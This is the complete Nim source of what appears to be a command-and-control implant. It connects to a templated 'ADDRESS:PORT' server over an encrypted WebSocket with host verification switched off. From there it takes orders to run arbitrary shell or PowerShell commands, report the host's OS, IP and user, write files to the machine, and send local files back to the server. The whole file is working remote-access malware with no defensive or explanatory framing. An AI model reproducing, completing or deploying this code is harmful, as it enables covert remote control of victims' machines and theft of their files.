import os
import net
import osproc
import std/json
import streams
import strutils
import strformat
import chronos
import libsodium/sodium
import libsodium/sodium_sizes
import websock/[websock, extensions/compression/deflate]

proc virtualCd(dir, input: string) =
  let rawPath = input.strip()
  var path =
    if rawPath.startsWith("cd "):
      rawPath[3..^1].strip()
    else:
      rawPath

  if path.isAbsolute():
    setCurrentDir(path)
  else:
    var result = dir & "/" & path
    setCurrentDir(result.normalizedPath().absolutePath())

proc chunk(fs: Stream, count: int, unit: int, size: int): seq[byte] =
  let pos = (count - 1) * unit
  fs.setPosition(pos)
  result = newSeq[byte](size)
  let readBytes = fs.readData(addr result[0], size)
  result.setLen(readBytes)

proc main() {.async.} =
  let id = "AGENTID"
  let os = $hostOS
  var data = ""

  # IP
  var ip = ""
  try:
    let sock = newSocket()
    sock.connect("ADDRESS", Port(PORT))
    ip = sock.getLocalAddr()[0]
    sock.close()
  except:
    quit(1)

  # User
  let user = getEnv("USER", getEnv("USERNAME", "unknown"))

  # Directory
  var dir = getCurrentDir()

  # Crypto
  let spk = parseHexStr("SERVERPUBLICKEY")
  let ask = parseHexStr("AGENTSECRETKEY")

  proc encrypt(input: string): string =
    let n = randombytes(24)
    let ct = crypto_box_easy(input, n, spk, ask)
    return toHex(n) & toHex(ct)

  proc encryptBytes(input: seq[byte]): string =
    let n = randombytes(24)
    let ct = crypto_box_easy(cast[string](input), n, spk, ask)
    return toHex(n) & toHex(ct)
  
  proc decrypt(input: string): string =
    let n = parseHexStr(input[0..47])
    let ct = parseHexStr(input[48..^1])
    let pt = crypto_box_open_easy(ct, n, spk, ask)
    return pt

  proc decryptBytes(input: string): seq[byte] =
    let n = parseHexStr(input[0..47])
    let ct = parseHexStr(input[48..^1])
    let pt = crypto_box_open_easy(ct, n, spk, ask)
    return cast[seq[byte]](pt)

  # Connect
  let ws = await WebSocket.connect("ADDRESS:PORT", path = "/wss", secure = true, flags = {TLSFlags.NoVerifyHost, TLSFlags.NoVerifyServerName})
  try:
    await ws.send(encrypt(id))
  except:
    quit(1)

  while true:
    try:
      var msg = await ws.recvMsg()
      if msg.len <= 0:
        continue
      else:
        var task = parseJson(decrypt(cast[string](msg)))

        # Exit
        if task["code"].getInt() == 0:
          await ws.send(encrypt("Done"))
          await ws.close()
          break

        # Shell
        if task["code"].getInt() == 1:
          if task["data"].getStr().startsWith("cd "):
            virtualCd(dir, task["data"].getStr())
            dir = getCurrentDir()
            await ws.send(encrypt(dir & "\n"))
          else:
            if os == "windows":
              data = "powershell -c " & task["data"].getStr()
            else:
              data = task["data"].getStr()
            let command = execCmdEx(data)
            await ws.send(encrypt(command.output))

        # Info
        if task["code"].getInt() == 2:
          let output = "OS: " & os & "\n" & "IP: " & ip & "\n" & "USER: " & user
          await ws.send(encrypt(output))

        # Upload
        if task["code"].getInt() == 3:
          let file = task["data"].getStr().split(" ")[0]
          var total = parseInt(task["data"].getStr().split(" ")[1])
          echo "Got: " & file & ", Size: " & $total
          if not fileExists(file):
            var pos = 1
            var stop = 1
            var next = ""
            let size = 65536
            let rem = total %% size
            stop = int((total - rem) / size)
            if rem > 0:
              stop = stop + 1
            var chunk = newSeq[byte](size)
            let fs = newFileStream(file, fmAppend)
            defer: fs.close()

            await ws.send(encrypt("Okay"))

            while pos <= stop:
              msg = await ws.recvMsg()
              chunk = decryptBytes(cast[string](msg))
              fs.setPosition((pos - 1) * size)
              fs.writeData(addr chunk[0], chunk.len)
              pos += 1

          else:
            await ws.send("File exists.")

        # Download
        if task["code"].getInt() == 4:
          let file = task["data"].getStr()
          echo "Got: " & file
          if fileExists(file):
            var pos = 1
            var stop = 1
            var next = ""
            let size = 65536
            let total = getFileSize(file)
            let rem = total %% size
            stop = int((total - rem) / size)
            let fs = newFileStream(file, fmRead)
            defer: fs.close()
        
            await ws.send(encrypt($total))
            
            while pos <= stop:
              next = encryptBytes(chunk(fs, pos, size, size))
              await ws.send(next)
              pos += 1
        
            if rem > 0:
              next = encryptBytes(chunk(fs, pos, size, rem))
              await ws.send(next)
          else:
            await ws.send("No such file.")

    except:
      continue

waitFor main()
